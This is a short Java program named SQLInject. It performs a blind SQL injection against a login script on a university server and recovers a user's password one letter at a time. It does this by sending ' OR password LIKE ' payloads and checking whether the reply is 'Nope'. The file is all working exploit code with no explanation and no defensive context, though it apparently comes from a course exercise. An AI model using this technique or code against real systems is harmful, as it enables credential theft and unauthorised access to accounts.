import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.List;
import java.util.ArrayList;
import java.util.Arrays;

public class SQLInject {

    public static void main(String[] args) throws Exception {

        List <Character> alphabet = new ArrayList <Character> (Arrays.asList('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'));
        BufferedReader in;
        String tempPassword = "";
        URL tempURL;
        String inputLine;

        for (int i = 0; i < 8; ++i) {
          for (int j = 0; j < alphabet.size(); ++j) {
            tempURL = new URL("http://st223.dcs.kcl.ac.uk:8080/osc2/tin.php?username=tin&password='+OR+password+LIKE+'" + tempPassword + alphabet.get(j) + "%");
            in = new BufferedReader(new InputStreamReader(tempURL.openStream()));
            if (!in.readLine().equals("Nope")) {
              tempPassword += alphabet.get(j);
              break;
            }
            in.close();
          }
        }
        System.out.println(tempPassword);
    }
}
